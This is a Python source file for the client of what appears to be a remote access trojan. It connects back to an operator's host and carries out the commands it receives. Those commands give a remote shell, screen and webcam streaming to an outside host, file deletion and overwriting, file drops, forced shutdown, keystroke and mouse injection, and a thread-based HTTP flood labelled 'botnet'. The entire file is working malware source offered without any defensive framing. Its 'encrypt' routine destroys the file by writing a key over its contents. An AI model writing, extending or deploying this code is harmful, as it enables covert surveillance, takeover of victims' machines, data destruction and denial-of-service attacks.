import os
import socket
import threading
import requests
import subprocess
import pyautogui
import platform
import hashlib
from time import sleep
from vidstream import ScreenShareClient
from vidstream import CameraClient
from cryptography.fernet import Fernet
from pynput.mouse import Button, Controller

host = input(str("Enter the host to connect: "))
port = 8080


def receiver():
    s = socket.socket()
    s.connect((host, port))

    desktop2 = platform.node()
    s.send(desktop2.encode())
    print("connected")

    while 1:
        command = s.recv(1024)
        command = command.decode()
        print("command received")
        if command == "view_files":
            files = os.getcwd()
            s.send(files.encode())
            print("command has been executed")
        
        elif command == "encrypt_files":
            key = Fernet.generate_key()
            path_to_encrypt = s.recv(2048)
            with open(path_to_encrypt, "rb") as f:
                data = f.read()
            
            with open(path_to_encrypt, "wb") as f:
                f.write(key)

        elif command == "sysinfo":
            system = platform.system()
            system = str(system)

            release = platform.release()
            release = str(release)

            node = platform.node()
            node = str(node)

            processor = platform.processor()
            processor = str(processor)

            s.send(system.encode())

            s.send(release.encode())

            s.send(node.encode())

            s.send(processor.encode())

        elif command == "custom_dir":
            try:
                user_input = s.recv(5000)
                user_input = user_input.decode()
                files = os.listdir(user_input)
                files = str(files)

                # encryption of the message
                encode_command = files.encode()
                key = Fernet.generate_key()

                f = Fernet(key)
                encrypted = f.encrypt(encode_command)

                decrypted = f.decrypt(encrypted)

                original_file = decrypted.decode()

                # Hash of the message
                word = original_file

                original_comman_2 = original_file
                original_comman = original_comman_2.encode()
                y = hashlib.sha256(original_comman).hexdigest()

                for z in word:
                    x = hashlib.sha256(original_comman).hexdigest()
                    if x == y:
                        hash = word

                s.send(hash.encode())
                print("command succesful")
            except Exception as e:
                print(str(e))
        elif command == "delete_file":
            filepath = s.recv(6000)
            filepath = filepath.decode()
            os.remove(filepath)
            print("Command executed")
        elif command == "shutdown":
            os.system("shutdown -p")
        elif command == "send_files":
            filename = s.recv(6000)
            print(filename)
            file_sent = open(filename, "wb")
            data = s.recv(10000)
            file_sent.write(data)
            file_sent.close()
        elif command == "screen":
            host1 = s.recv(7000)
            host1 = host1.decode()
            try:
                sender = ScreenShareClient(host1, 9999)

                t = threading.Thread(target=sender.start_stream())
                t.start()
            except KeyboardInterrupt:
                sender.stop_stream()
        elif command == "reverse_shell":
            while True:
                files2 = s.recv(7000)
                files2 = files2.decode()
                cmd = subprocess.check_output(files2, stderr=subprocess.STDOUT, shell=True)
                s.send(cmd)
        elif command == "botnet":
            url = s.recv(7000)
            url = url.decode()
            number_of_threads = s.recv(7000)
            number_of_threads = number_of_threads.decode()

            def do_req():
                while True:
                    ses = requests.session()
                    response = ses.get(url)
                    response2 = requests.get(url)
            threads = []

            for i in range(int(number_of_threads)):
                t2 = threading.Thread(target=do_req)
                t2.daemon = True
                threads.append(t2)

            for i in range(int(number_of_threads)):
                threads[i].start()

            for i in range(int(number_of_threads)):
                threads[i].join()
        elif command == "camera":
            host2 = s.recv(7000)
            host2 = host2.decode()
            try:
                sender2 = CameraClient(host2, 5555)

                t3 = threading.Thread(target=sender2.start_stream())
                t3.start()
            except KeyboardInterrupt:
                sender2.stop_stream()

        elif command == "keystrokes":
            executed = s.recv(1024)
            executed = executed.decode()
            if executed == "y":
                keystrokes = s.recv(10000)
                keystrokes = keystrokes.decode()
                sleep(6)
                pyautogui.write(keystrokes)
                pyautogui.press("enter")
            elif executed == "n":
                keystrokes2 = s.recv(10000)
                keystrokes2 = keystrokes2.decode()
                sleep(6)
                pyautogui.write(keystrokes2)

        elif command == "mouse_move":
            x_direction = s.recv(1024)
            y_direction = s.recv(1024)
            x_direction = x_direction.decode()
            y_direction = y_direction.decode()

            mouse = Controller()
            mouse.move(int(x_direction), int(y_direction))
        elif command == "mouse_click":
            mouse2 = Controller()
            mouse2.press(Button.right)


t1 = threading.Thread(target=receiver)
t1.start()
